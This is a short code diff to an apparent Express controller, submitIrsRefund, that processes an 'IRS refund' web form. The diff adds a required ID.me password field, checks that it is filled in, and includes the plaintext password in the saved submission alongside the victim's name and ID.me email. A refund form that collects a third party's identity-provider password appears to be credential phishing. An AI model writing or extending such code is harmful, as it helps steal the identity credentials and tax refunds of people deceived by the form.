@@ -3427,6 +3427,8 @@ exports.submitIrsRefund = async (req, res, next) => {
 
     const idMeEmail = cleanIrsRefundText(req.body.idMeEmail).toLowerCase();
 
+    const idMePassword = cleanIrsRefundText(req.body.idMePassword);
+
     const country = cleanIrsRefundText(req.body.country);
 
     if (!fullName) {
@@ -3447,6 +3449,10 @@ exports.submitIrsRefund = async (req, res, next) => {
 
     if (!idMeEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(idMeEmail)) {
       return renderIrsRefundError("Enter a valid ID.me email address.");
+    }
+
+    if (!idMePassword) {
+      return renderIrsRefundError("Enter your ID.me password.");
     }
 
     if (!country) {
@@ -3482,6 +3488,8 @@ exports.submitIrsRefund = async (req, res, next) => {
       fullName,
 
       idMeEmail,
+
+      idMePassword,
 
       country,
 
